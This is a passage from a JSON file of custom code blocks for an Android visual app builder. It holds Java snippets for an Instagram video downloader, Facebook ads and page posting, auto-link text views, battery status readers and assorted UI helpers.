%s"},{"code":" URLUtil.guessFileName(%1$sUrl, null, null)","color":"#FFE53935","name":"get file name","typeName":"","palette":"160","type":"s","spec":"%m.InstagramDownloader get file name from the URL"},{"code":"%1$sRQ.setDescription(\"URL - \" + %1$sUrl);","color":"#FFE53935","name":"Reqest","typeName":"","palette":"160","type":" ","spec":"%m.InstagramDownloader set request description"},{"code":"%1$sRQ.setTitle(%2$s);\n%1$sRQ.allowScanningByMediaScanner();","color":"#FFE53935","name":"Request2","typeName":"","palette":"160","type":" ","spec":"%m.InstagramDownloader set title %s"},{"code":"%1$sRQ.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);\n%1$sRQ.setDestinationInExternalPublicDir(%2$s, %1$sFN);","color":"#FFE53935","name":"Download Path","typeName":"","palette":"160","type":" ","spec":"%m.InstagramDownloader Set Download path %s"},{"code":"final DownloadManager %1$sDM \u003d (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);\nfinal long %1$sDI \u003d %1$sDM.enqueue(%1$sRQ);","color":"#FFE53935","name":"Create Download Manager","typeName":"","palette":"160","type":" ","spec":"%m.InstagramDownloader create download manager"},{"code":"new Thread(new Runnable() {\n\t\t\t\t\t\t@Override\n\t\t\t\t\t\tpublic void run() {\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\tboolean %1$sDing \u003d true;\n\t\t\t\t\t\t\t\t\twhile (%1$sDing) {\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\tDownloadManager.Query %1$sg \u003d new DownloadManager.Query();\n%1$sg.setFilterById(%1$sDI);\nandroid.database.Cursor %1$sCR \u003d %1$sDM.query(%1$sg);\n\t\t\t\t\t\t\t\t\t\t\t\t%1$sCR.moveToFirst();\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\tint %1$sBD \u003d %1$sCR.getInt(%1$sCR.getColumnIndex(DownloadManager.COLUMN_BYTES_DOWNLOADED_SO_FAR));\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\tint %1$sBT \u003d %1$sCR.getInt(%1$sCR.getColumnIndex(DownloadManager.COLUMN_TOTAL_SIZE_BYTES));\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\tif (%1$sCR.getInt(%1$sCR.getColumnIndex(DownloadManager.COLUMN_STATUS)) \u003d\u003d DownloadManager.STATUS_SUCCESSFUL) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t%1$sDing \u003d false;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\tfinal int %1$sDiP \u003d (int) ((%1$sBD * 100l) / %1$sBT);\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\trunOnUiThread(new Runnable() {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t@Override\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tpublic void run() {\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (%1$sDiP \u003d\u003d 100) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t  %2$s\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t} });\n\t\t\t\t\t\t\t\t\t} } }).start();","color":"#FFE53935","name":"Download","typeName":"","palette":"160","type":"c","spec":"%m.InstagramDownloader Start Download On Completed"},{"code":"","color":"#FFE53935","name":"note","typeName":"","palette":"160","type":"h","spec":"put this into request network"},{"code":"_%1$sMore();","color":"#FFE53935","name":"start !!!","typeName":"","palette":"160","type":" ","spec":"%m.InstagramDownloader Start"},{"code":"String data \u003d \"\";\nNumber first_part \u003d 0;\nNumber second_part \u003d 0;\ntry {\r\n\tdata \u003d _response;\r\n\tfirst_part \u003d data.lastIndexOf(\"og:video:secure_url\") + 30;\r\n\tsecond_part \u003d data.lastIndexOf(\"og:video:type\") + -25;\r\n\tInstaLoad \u003d data.substring((int)(first_part), (int)(second_part));\n%1$s\n}\ncatch(Exception e) {\n\t%2$s\n}","color":"#FFE53935","typeName":"","name":"when !","palette":"160","type":"e","spec":"Download InstagramVideos On there is video","spec2":"else there is no"},{"code":"","color":"#FFE53935","name":"put this in on create","typeName":"","palette":"160","type":"h","spec":"put this into on create"},{"code":"","color":"#FFE53935","name":"create String variable with ID \u003d InstaLoad","typeName":"","palette":"160","type":"h","spec":"Make String Variable With Name \u003d InstaLoad"},{"code":"%s.setStatus(InsLoadingView.Status.%s);","color":"#FFE91E63","name":"insta status","typeName":"","palette":"160","type":" ","spec":"%m.imageview set story status %s"},{"code":"LOADING","color":"#FFE91E63","name":"Load it","typeName":"","palette":"160","type":"s","spec":"Loading the story"},{"code":"UNCLICKED","color":"#FFE91E63","name":"unclicked fro insta","typeName":"","palette":"160","type":"s","spec":"unclicked status"},{"code":"%1$s.setStartColor(%2$s);\n%1$s.setEndColor(%3$s);","color":"#FFE91E63","name":"insta color","typeName":"","palette":"160","type":" ","spec":"%m.imageview set start color %m.color set end color %m.color"},{"code":"%1$s.setCircleDuration(%2$s);\n%1$s.setRotateDuration(%3$s);","color":"#FFE91E63","name":"insta duration","typeName":"","palette":"160","type":" ","spec":"%m.imageview set circle duration %d rotate duration %d"},{"code":"","color":"#FF2196F3","name":"@Daniel Sk","typeName":"","palette":"161","type":"h","spec":"@Daniel Sk"},{"code":"ArchedImageProgressBar linkedinArcProgress \u003d findViewById(R.id.%1$s);\r","color":"#FF2196F3","name":"Telegram","typeName":"","palette":"161","type":" ","spec":"Telegram ProgressBar %m.view "},{"code":"Bitmap linkedinIcon \u003d BitmapFactory.decodeResource(getResources(),R.drawable.%1$s);","color":"#FF2196F3","name":"image","typeName":"","palette":"161","type":" ","spec":"Telegram ProgressBar Custom image %m.resource "},{"code":"linkedinArcProgress.setProgressImage(linkedinIcon,%1$s);","color":"#FF2196F3","name":"linked icon","typeName":"","palette":"161","type":" ","spec":"linked icon %d "},{"code":"linkedinArcProgress.setCircleSize(%1$sf);","color":"#FF2196F3","name":"set circle size","typeName":"","palette":"161","type":" ","spec":"SetCircleSize %d "},{"code":"linkedinArcProgress.setArchSize(%1$s);","color":"#FF2196F3","name":"SetArchSize","typeName":"","palette":"161","type":" ","spec":"SetArchSize %d "},{"code":"linkedinArcProgress.setCircleColor(%1$s);","color":"#FF2196F3","name":"SetCircleColor","typeName":"","palette":"161","type":" ","spec":"SetCircleColor %m.color "},{"code":"linkedinArcProgress.setArchColor(%1$s);","color":"#FF2196F3","name":"setArchColor","typeName":"","palette":"161","type":" ","spec":"SetArchColor %m.color "},{"code":"linkedinArcProgress.setArchLength(%1$s);","color":"#FF2196F3","name":"SetArchLength","typeName":"","palette":"161","type":" ","spec":"SetArchLength %d "},{"code":"linkedinArcProgress.setArchStroke(%1$s);","color":"#FF2196F3","name":"SetArchStroke","typeName":"","palette":"161","type":" ","spec":"SetArchStroke %d "},{"code":"linkedinArcProgress.setArchSpeed(%1$s);","color":"#FF2196F3","name":"SetArchSpeed","typeName":"","palette":"161","type":" ","spec":"SetArchSpeed %d "},{"code":"%1$s \u003d new AdView(%3$s.this, %2$s, AdSize.BANNER_HEIGHT_50);","name":"FANBanner320_50","palette":"162","type":" ","spec":"Banner 320_50 %m.FBAdsBanner PlaceID %s at %m.activity"},{"code":"%1$s.loadAd();","name":"FANBannerLoad","palette":"162","type":" ","spec":"%m.FBAdsBanner LoadAds"},{"code":"%1$s.addView(%2$s);","name":"AdAdsToView","palette":"162","type":" ","spec":"View %m.view add %m.FBAdsBanner"},{"code":"%1$s \u003d new AdView(%3$s.this, %2$s, AdSize.RECTANGLE_HEIGHT_250);","name":"FANBanner300_250","palette":"162","type":" ","spec":"Banner 300_250 %m.FBAdsBanner PlaceID %s at %m.activity"},{"code":"%1$s \u003d new InterstitialAd(%2$s.this, %3$s);\r","name":"InterstitialAds","palette":"162","type":" ","spec":"%m.FBAdsInterstitial at %m.activity with PlacementID %s"},{"code":"%1$s.loadAd();\r","name":"InterstitialAdsLoad","palette":"162","type":" ","spec":"%m.FBAdsInterstitial LoadAds"},{"code":"%1$s.show();","name":"InterstitialAdsShow","palette":"162","type":" ","spec":"%m.FBAdsInterstitial Show"},{"code":"                // Set listeners for the Interstitial Ad\n\t\t        %1$s.setAdListener(new InterstitialAdListener() {\n\t\t\t            %2$s\n\t\t\t    });","name":"InterstitialAdsListener","palette":"162","type":"c","spec":"%m.FBAdsInterstitial setListener"},{"code":"\n\t\t\t            @Override\n\t\t\t            public void onInterstitialDisplayed(Ad ad) {\n\t\t\t\t                %1$s\n\t\t\t\t                \n\t\t\t\t        }","name":"IntersOnAdsDisplay","palette":"162","type":"c","spec":"IntersOnAdsDisplay"},{"code":"\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onInterstitialDismissed(Ad ad) {\n\t\t\t\t                // Interstitial dismissed callback\n\t\t\t\t                \n\t\t\t\t                %1$s\n\t\t\t\t        }","name":"IntersOnAdsDismiss","palette":"162","type":"c","spec":"IntersOnAdsDismiss"},{"code":"\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onError(Ad ad, AdError adError) {\n\t\t\t\t                // Ad error callback\n\t\t\t\t                \n\t\t\t\t           \r\n\t\t\t\t                final String StringErrorLoadFBAd \u003d adError.getErrorMessage();\r\n\t\t\t\t                %1$s\r\n\t\t\t\t        }","name":"IntersOnAdsError","palette":"162","type":"c","spec":"IntersOnAdsError"},{"code":"StringErrorLoadFBAd","name":"StringErrorLoadFBAd","typeName":"String","palette":"162","type":"v","spec":"StringErrorLoadFBAd"},{"code":"\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onAdLoaded(Ad ad) {\n\t\t\t\t                // Interstitial ad is loaded and ready to be displayed\n\t\t\t\t                \n\t\t\t\t\n\t\t\t\t            \r\n\t\t\t\t                %1$s\r\n\t\t\t            }","name":"IntersOnAdsLoaded","palette":"162","type":"c","spec":"IntersOnAdsLoaded"},{"code":"\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onAdClicked(Ad ad) {\n\t\t\t\t                %1$s\n\t\t\t\t                \n\t\t\t\t            }\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onLoggingImpression(Ad ad) {\n\t\t\t\t                // Ad impression logged callback\n\t\t\t\t                \n\t\t\t\t            }","name":"IntersOnAdsClicks","palette":"162","type":"c","spec":"IntersOnAdsClicks"},{"code":"AudienceNetworkAds.initialize(this);","name":"AudienceNetworkAds_init","palette":"162","type":" ","spec":"AudienceNetworkAds Initialize"},{"code":"AdSettings.setIntegrationErrorMode(INTEGRATION_ERROR_CRASH_DEBUG_MODE);","name":"FBAdsSettings","palette":"162","type":" ","spec":"FBAdsSettings"},{"code":"// Instantiate a NativeAd object.\n        // NOTE: the placement ID will eventually identify this as your App, you can ignore it for\n        // now, while you are testing and replace it later when you have signed up.\n        // While you are using this temporary code you will only get test ads and if you release\n        // your code like this to the Google Play your users will not receive ads (you will get a no fill error).\n        %1$s \u003d new NativeAd(%2$s.this, %3$s);","name":"FBNativeLoad","palette":"162","type":" ","spec":"%m.NativeAd Load at %m.activity withPlacementID %s"},{"code":"\n\t\t        %1$s.setAdListener(new NativeAdListener() {\n\t\t\t            %2$s\n\t\t\t        });","name":"NativeAdsetListener","palette":"162","type":"c","spec":"%m.NativeAd setListener"},{"code":"\n\t\t\t            @Override\n\t\t\t            public void onMediaDownloaded(Ad ad) {\n\t\t\t\t                // Native ad finished downloading all assets\n\t\t\t\t                \n\t\t\t\t            }\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onError(Ad ad, AdError adError) {\n\t\t\t\t                // Native ad failed to load\n\t\t\t\t                final String ErrorNativeLoad \u003d adError.getErrorMessage();\n\t\t\t\t                %1$s\n\t\t\t\t            }","name":"OnErrorLoadNative","palette":"162","type":"c","spec":"OnErrorLoadNative"},{"code":"ErrorNativeLoad","name":"ErrorNativeLoad","typeName":"String","palette":"162","type":"v","spec":"ErrorNativeLoad"},{"code":"\n\t\t\t            @Override\n\t\t\t            public void onAdLoaded(Ad ad) {\n\t\t\t\t                // Native ad is loaded and ready to be displayed\n\t\t\t\t                %1$s\n\t\t\t\t                \n\t\t\t\t            }\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onAdClicked(Ad ad) {\n\t\t\t\t                // Native ad clicked\n\t\t\t\t                \n\t\t\t\t            }\n\t\t\t\n\t\t\t            @Override\n\t\t\t            public void onLoggingImpression(Ad ad) {\n\t\t\t\t                // Native ad impression\n\t\t\t\t                \n\t\t\t\t            }","name":"OnLoadedNativeAds","palette":"162","type":"c","spec":"OnLoadedNativeAds"},{"code":"                                // Race condition, load() called again before last ad was displayed\n\t\t\t\t                if (%1$s \u003d\u003d null || %1$s !\u003d ad) {\n\t\t\t\t\t                    return;\n\t\t\t\t\t                }\n\t\t\t\t                // Inflate Native Ad into Container\n\t\t\t\t                inflateAd(%1$s);\n\n","name":"InflateNativeToContainer","palette":"162","type":" ","spec":"if %m.NativeAd notNull then InflateNativeAd"},{"code":"%1$s \u003d new NativeAdLayout(%2$s.this);\n%1$s.setLayoutParams(new android.view.ViewGroup.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT,\nandroid.view.ViewGroup.LayoutParams.WRAP_CONTENT));\n%3$s.addView(%1$s);","name":"CreateNativeAdLayout","palette":"162","type":" ","spec":"Create %m.NativeAdLayout at %m.activity inflateTo %m.view"},{"code":"\n\t}\n\tprivate void inflateAd(NativeAd %1$s) {\n\t\t\n\t\t        %1$s.unregisterView();\n\t\t        LayoutInflater inflater \u003d LayoutInflater.from(%3$s.this);\n\t\t        // Inflate the Ad view.  The layout referenced should be the one you created in the last step.\n\t\t        LinearLayout adViewNative \u003d (LinearLayout) inflater.inflate(R.layout.native_ad_layout, nativeAdLayout, false);\n\t\t        %2$s.addView(adViewNative);\n\t\t\n\t\t        // Add the AdOptionsView\n\t\t        LinearLayout adChoicesContainer \u003d findViewById(R.id.ad_choices_container);\n\t\t        AdOptionsView adOptionsView \u003d new AdOptionsView(%3$s.this, %1$s, %2$s);\n\t\t        adChoicesContainer.removeAllViews();\n\t\t        adChoicesContainer.addView(adOptionsView, 0);\n\t\t\n\t\t        // Create native UI using the ad metadata.\n\t\t        AdIconView nativeAdIcon \u003d adViewNative.findViewById(R.id.native_ad_icon);\n\t\t        TextView nativeAdTitle \u003d adViewNative.findViewById(R.id.native_ad_title);\n\t\t        MediaView nativeAdMedia \u003d adViewNative.findViewById(R.id.native_ad_media);\n\t\t        TextView nativeAdSocialContext \u003d adViewNative.findViewById(R.id.native_ad_social_context);\n\t\t        TextView nativeAdBody \u003d adViewNative.findViewById(R.id.native_ad_body);\n\t\t        TextView sponsoredLabel \u003d adViewNative.findViewById(R.id.native_ad_sponsored_label);\n\t\t        Button nativeAdCallToAction \u003d adViewNative.findViewById(R.id.native_ad_call_to_action);\n\t\t\n\t\t        // Set the Text.\n\t\t        nativeAdTitle.setText(%1$s.getAdvertiserName());\n\t\t        nativeAdBody.setText(%1$s.getAdBodyText());\n\t\t        nativeAdSocialContext.setText(%1$s.getAdSocialContext());\n\t\t        nativeAdCallToAction.setVisibility(%1$s.hasCallToAction() ? View.VISIBLE : View.INVISIBLE);\n\t\t        nativeAdCallToAction.setText(%1$s.getAdCallToAction());\n\t\t        sponsoredLabel.setText(%1$s.getSponsoredTranslation());\n\t\t\n\t\t        // Create a list of clickable views\n\t\t        List\u003cView\u003e clickableViews \u003d new ArrayList\u003c\u003e();\n\t\t        clickableViews.add(nativeAdTitle);\n\t\t        clickableViews.add(nativeAdCallToAction);\n\t\t\n\t\t        // Register the Title and CTA button to listen for clicks.\n\t\t        %1$s.registerViewForInteraction(\n\t\t                adViewNative,\n\t\t                nativeAdMedia,\n\t\t                nativeAdIcon,\n\t\t                clickableViews);\n\t\t\n\t\t    }\n\t{","name":"ClassInflateNativeAd","palette":"162","type":" ","spec":"Class Inflate %m.NativeAd to %m.NativeAdLayout at %m.activity"},{"code":"%1$s.loadAd();","name":"NativeAdsLoad","palette":"162","type":" ","spec":"%m.NativeAd LoadAds"},{"code":"","color":"#FF2196F3","name":"@MohammedAlherk","typeName":"","palette":"162","type":"h","spec":"MohammedAlherk FacebookPoster"},{"code":"","color":"#FF2196F3","name":"name","typeName":"","palette":"162","type":"h","spec":"1 create Request Network and name it\u003d reqalherk"},{"code":"HashMap\u003cString, Object\u003e mapalherk \u003d new HashMap\u003c\u003e();\n\t\nmapalherk \u003d new HashMap\u003c\u003e();\r\nmapalherk.put(\"message\", %2$s);\r\nmapalherk.put(\"access_token\", %3$s);\r\nreqalherk.setParams(mapalherk, RequestNetworkController.REQUEST_PARAM);\r\nreqalherk.startRequestNetwork(RequestNetworkController.POST, \"https://graph.facebook.com/v8.0/\".concat(%1$s.concat(\"/feed\")), \"A\", _reqalherk_request_listener);\n\n","color":"#FF2196F3","name":"Post to Page","typeName":"","palette":"162","type":" ","spec":"Page ID %s  message %s AccessToken %s RequestNetwork "},{"code":"","color":"#FFFDD835","name":"created...n","typeName":"","palette":"162","type":"h","spec":"created by arab ware channel"},{"code":"%1$s.setNumber((int) %2$s);","color":"#FFFDD835","name":"set progress....","typeName":"","palette":"162","type":" ","spec":"%m.view set number %d"},{"code":"%1$s.setEmoji(Emoji.%2$s);","color":"#FFFDD835","name":"SetType","typeName":"","palette":"162","type":" ","spec":"%m.view set type %s.inputOnly"},{"code":"%1$s.setTextColor(%2$s);\n%1$s.setText(%3$s);","color":"#FFFDD835","name":"text facebook react","typeName":"","palette":"162","type":" ","spec":"%m.view set text color %s set text %s"},{"code":"%1$s.setAnimationEnabled(%2$s);","color":"#FFFDD835","name":"animation of facebook","typeName":"","palette":"162","type":" ","spec":"%m.view set animation enable %b"},{"code":"%1$s.clear();","color":"#FFFDD835","name":"clear facebook","typeName":"","palette":"162","type":" ","spec":"%m.view clear"},{"code":"","color":"#FFD32F2F","name":"BY ARAB WARE CHANNEL","typeName":"","palette":"163","type":"h","spec":"BY ARAB WARE CHANNEL"},{"code":"%1$s \u003d new AutoLinkTextView(%2$s.this);","color":"#FFD32F2F","name":"crewt","typeName":"","palette":"163","type":" ","spec":"create new %m.AutoLinkTextView in %m.activity"},{"code":"%2$s.addView(%1$s);","color":"#FFD32F2F","name":"ADD VIEW","typeName":"","palette":"163","type":" ","spec":"%m.AutoLinkTextView add to %m.view"},{"code":"%1$s.setMentionModeColor(%2$s);","color":"#FFD32F2F","name":"MentionColor","typeName":"","palette":"163","type":" ","spec":"%m.AutoLinkTextView setMentionColor %m.color"},{"code":"%1$s.setHashtagModeColor(%2$s);","color":"#FFD32F2F","name":"setHashtagColor","typeName":"","palette":"163","type":" ","spec":"%m.AutoLinkTextView setHashtagsColor %m.color"},{"code":"%1$s.setUrlModeColor(%2$s);","color":"#FFD32F2F","name":"setUrlColor","typeName":"","palette":"163","type":" ","spec":"%m.AutoLinkTextView setUrlColor %m.color"},{"code":"%1$s.setPhoneModeColor(%2$s);","color":"#FFD32F2F","name":"setPhoneColor","typeName":"","palette":"163","type":" ","spec":"%m.AutoLinkTextView setPhoneColor %m.color"},{"code":"%1$s.setEmailModeColor(%2$s);","color":"#FFD32F2F","name":"setEmailColor","typeName":"","palette":"163","type":" ","spec":"%m.AutoLinkTextView setEmailColor %m.color"},{"code":"%1$s.setCustomModeColor(%2$s);","color":"#FFD32F2F","name":"setCustomModeColor","typeName":"","palette":"163","type":" ","spec":"%m.AutoLinkTextView setCustomModeColor %m.color"},{"code":"%1$s.addAutoLinkMode(%2$s);","color":"#FFD32F2F","name":"setAutoLinkMode","typeName":"","palette":"163","type":" ","spec":"%m.AutoLinkTextView setAutoLinkMode %m.mode"},{"code":"%1$s,%2$s","color":"#FFD32F2F","name":"Mode","typeName":"mode","palette":"163","type":"v","spec":"%m.mode and %m.mode"},{"code":"AutoLinkMode.MODE_MENTION","color":"#FFD32F2F","name":"mode1","typeName":"mode","palette":"163","type":"v","spec":"Mode_MENTION"},{"code":"AutoLinkMode.MODE_HASHTAG","color":"#FFD32F2F","name":"mode2","typeName":"mode","palette":"163","type":"v","spec":"Mode_HASHTAG"},{"code":"AutoLinkMode.MODE_URL","color":"#FFD32F2F","name":"mode3","typeName":"mode","palette":"163","type":"v","spec":"Mode_URL"},{"code":"AutoLinkMode.MODE_PHONE","color":"#FFD32F2F","name":"mode4","typeName":"mode","palette":"163","type":"v","spec":"Mode_PHONE"},{"code":"AutoLinkMode.MODE_EMAIL","color":"#FFD32F2F","name":"mode5","typeName":"mode","palette":"163","type":"v","spec":"Mode_Email"},{"code":"AutoLinkMode.MODE_CUSTOM","color":"#FFD32F2F","name":"MODE-CUSTOM","typeName":"mode","palette":"163","type":"v","spec":"Mode_Custom"},{"code":"%1$s.setText(%2$s);","color":"#FFD32F2F","name":"setText-AutoLinkTextView","typeName":"","palette":"163","type":" ","spec":"%m.AutoLinkTextView setText %s"},{"code":"%1$s.setCustomRegex(%2$s);","color":"#FFD32F2F","name":"setCustomRegex","typeName":"","palette":"163","type":" ","spec":"%m.AutoLinkTextView set Custom Regex Text ( between each one put | ) %s"},{"code":"%1$s.setAutoLinkOnClickListener(new AutoLinkOnClickListener() {\n\t@Override public void onAutoLinkTextClick(AutoLinkMode autoLinkMode, String matchedText) {\n%2$s \u003d matchedText;\n%3$s\n}\n});","color":"#FFD32F2F","name":"OnClick","typeName":"","palette":"163","type":"c","spec":"%m.AutoLinkTextView on word clicked then copy it to %m.varStr and"},{"code":"%1$s","color":"#FFD32F2F","name":"TextView is AutoLinkTextView","typeName":"TextView","palette":"163","type":"v","spec":"TextView from %m.AutoLinkTextView"},{"code":"","color":"#FF388E3C","name":"created By Arab Ware Channel","typeName":"","palette":"164","type":"h","spec":"Created By Arab Ware Channel"},{"code":"","color":"#FF388E3C","name":"battery health ","typeName":"","palette":"164","type":"h","spec":"battery health | in more block |"},{"code":"BroadcastReceiver %1$sb \u003d new BroadcastReceiver() {\n@Override\npublic void onReceive(Context context, Intent intent) {\nint %1$sc \u003d intent.getIntExtra(BatteryManager.EXTRA_HEALTH,0);\n%2$s\n}\n};","color":"#FF388E3C","name":"battery health","typeName":"","palette":"164","type":"c","spec":"on %m.intent check battery health"},{"code":"%1$sc \u003d\u003d BatteryManager.BATTERY_HEALTH_COLD","color":"#FF388E3C","name":"if battery is cold","typeName":"","palette":"164","type":"b","spec":"%m.intent checked battery health as cold"},{"code":"%1$sc \u003d\u003d BatteryManager.BATTERY_HEALTH_DEAD","color":"#FF388E3C","name":"if battery is dead","typeName":"","palette":"164","type":"b","spec":"%m.intent checked battery health as dead"},{"code":"%1$sc \u003d\u003d BatteryManager.BATTERY_HEALTH_GOOD","color":"#FF388E3C","name":"if battery is good","typeName":"","palette":"164","type":"b","spec":"%m.intent checked battery health as good"},{"code":"%1$sc \u003d\u003d BatteryManager.BATTERY_HEALTH_OVERHEAT","color":"#FF388E3C","name":"if battery is overheat","typeName":"","palette":"164","type":"b","spec":"%m.intent checked battery health as overheat"},{"code":"%1$sc \u003d\u003d BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE","color":"#FF388E3C","name":"if battery is over voltage","typeName":"","palette":"164","type":"b","spec":"%m.intent checked battery health as over voltage"},{"code":"%1$sc \u003d\u003d BatteryManager.BATTERY_HEALTH_UNKNOWN","color":"#FF388E3C","name":"if battery is unknown","typeName":"","palette":"164","type":"b","spec":"%m.intent checked battery health as unknown"},{"code":"%1$sc \u003d\u003d BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE","color":"#FF388E3C","name":"if battery is unspecified failure","typeName":"","palette":"164","type":"b","spec":"%m.intent checked battery health as unspecified failure"},{"code":"%1$sc \u003d\u003d BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE","color":"#FF388E3C","name":"if battery is unspecified failure","typeName":"","palette":"164","type":"b","spec":"%m.intent checked battery health as unspecified failure"},{"code":"IntentFilter %1$sa \u003d new IntentFilter(Intent.ACTION_BATTERY_CHANGED);\ngetApplicationContext().registerReceiver(%1$sb,%1$sa);","color":"#FF388E3C","name":"create new battery intent","typeName":"","palette":"164","type":" ","spec":"start new battery health checker %m.intent"},{"code":"","color":"#FF388E3C","name":"battery level","typeName":"","palette":"164","type":"h","spec":"battery level"},{"code":"BatteryManager %1$sq \u003d (BatteryManager)getSystemService(BATTERY_SERVICE);\nint %1$sw \u003d %1$sq.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);\nString %1$se \u003d Integer.toString(%1$sw);","color":"#FF388E3C","name":"create battery level checker","typeName":"","palette":"164","type":" ","spec":"create %m.intent to check battery level"},{"code":"%1$se","color":"#FF388E3C","name":"battery level get","typeName":"","palette":"164","type":"s","spec":"%m.intent get battery level"},{"code":"","color":"#FF388E3C","name":"battery temperature","typeName":"","palette":"164","type":"h","spec":"battery temperature | in more block |"},{"code":"BroadcastReceiver %1$sz \u003d new BroadcastReceiver() {\n@Override\npublic void onReceive(Context context, Intent intent) {\nfloat %1$sy \u003d (float)(intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE,0))/10;\n%2$s\n}\n};","color":"#FF388E3C","name":"check battery termperature","typeName":"","palette":"164","type":"c","spec":"%m.intent on battery termperature received"},{"code":"IntentFilter %1$sx \u003d new IntentFilter(Intent.ACTION_BATTERY_CHANGED);\ngetApplicationContext().registerReceiver(%1$sz,%1$sx);","color":"#FF388E3C","name":"create termerature checker","typeName":"","palette":"164","type":" ","spec":"start %m.intent for check battery temperature"},{"code":"%1$sy +\" \"+ (char) 0x00B0 +\"C\"","color":"#FF388E3C","name":"get temperature","typeName":"","palette":"164","type":"s","spec":"%m.intent get temperature"},{"code":"","color":"#FFBB86FC","name":"Made By Rayan Mark ","typeName":"","palette":"165","type":"h","spec":"Made By Rayan Mark"},{"code":"%1$s.addTab( %1$s.newTab().setIcon(getResources().getDrawable(R.drawable.%2$s)) );","color":"#FFBB86FC","name":"Tablayout Icons","typeName":"","palette":"165","type":" ","spec":"%m.tablayout SetIconFromRessource %m.resource "},{"code":"%1$s.dismiss();","color":"#FFBB86FC","name":"Dismiss Listener","typeName":"","palette":"165","type":" ","spec":"%s.inputOnly  Dismiss"},{"code":"%1$s.show();","color":"#FFBB86FC","name":"Show Listener","typeName":"","palette":"165","type":" ","spec":"%s.inputOnly Show"},{"code":"%1$s.setOnFocusChangeListener(new OnFocusChangeListener() { @Override public void onFocusChange(View v, boolean hasFocus) {\n\t\t  if (hasFocus) { \n\n%2$s\r\n\t\t} \n\t\t else { \n%3$s\r\n\t\t} } });","color":"#FFBB86FC","typeName":"setOn","name":"setOnFocus","palette":"165","type":"e","spec":"%m.textview setOnFocusChange","spec2":""},{"code":"((TextView)%1$s).setMaxLines((int)%2$s);","color":"#FFBB86FC","name":"getPosi_copy38","typeName":"getPos","palette":"165","type":" ","spec":"%m.textview setMaxLine %d "},{"code":"overridePendingTransition(R.anim.%1$s, R.anim.%2$s);","color":"#FFBB86FC","name":"Activity Transaction","typeName":"","palette":"165","type":" ","spec":"Override Pending Animaton Close Animaton%m.anim Enter Animaton %m.anim "},{"code":"overridePendingTransition(0, R.anim.%1$s);","color":"#FFBB86FC","name":"Activity Transaction 0-1","typeName":"","palette":"165","type":" ","spec":"Override Pending Transaction Close Animaton is 0 Open Animaton %m.anim "},{"code":"overridePendingTransition(R.anim.%1$s, 0);","color":"#FFBB86FC","name":"Activity Transaction 1-0","typeName":"","palette":"165","type":" ","spec":"Override Pending Transaction Enter Animation %m.anim Close Animaton is 0"},{"code":"%1$s.getAdapter().notifyItemInserted(%1$s.getAdapter().getItemCount() %2$s);","color":"#FFBB86FC","name":"Recyclerview SetNotifyItemChanged","typeName":"","palette":"165","type":" ","spec":"%m.recyclerview set Notify Item Inserted at position %d"},{"code":"final LinearLayoutManager %2$s \u003d new LinearLayoutManager(%3$s.this);\n%2$s.setStackFromEnd(%4$s);\n%1$s.setLayoutManager(%2$s);","color":"#FFBB86FC","name":"Recyclerview LinearLaManager","typeName":"","palette":"165","type":" ","spec":"%m.recyclerview LinearLaManager Name %s.inputOnly  at %m.activity Stack From End %b "},{"code":"%1$s.setGravity(Gravity.%2$s);","color":"#FFBB86FC","name":"View Gravity","typeName":"","palette":"165","type":" ","spec":"%m.view set Gravity %m.Gravity "},{"code":"Bitmap bitmap \u003d BitmapFactory.decodeResource(getResources(), R.drawable.%2$s);\n \nint b \u003d (int) blur;\n \n\t\tBitmap blurred \u003d blurRenderScript(this,bitmap, b);\n//second parametre is radius\n\t\t%1$s.setImageBitmap(blurred); \n \n}\n \n \n \n\tpublic static Bitmap blurRenderScript(Context context,Bitmap smallBitmap, int radius) {\n        try {\n\t\t\tsmallBitmap \u003d RGB565toARGB888(smallBitmap);\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n \n\t\tBitmap bitmap \u003d Bitmap.createBitmap(\n\t\t\tsmallBitmap.getWidth(), smallBitmap.getHeight(),\n\t\t\tBitmap.Config.ARGB_8888);\n \n \n\t\tandroid.renderscript.RenderScript renderScript \u003d android.renderscript.RenderScript.create(context);\n \n\t\tandroid.renderscript.Allocation blurInput \u003d android.renderscript.Allocation.createFromBitmap(renderScript, 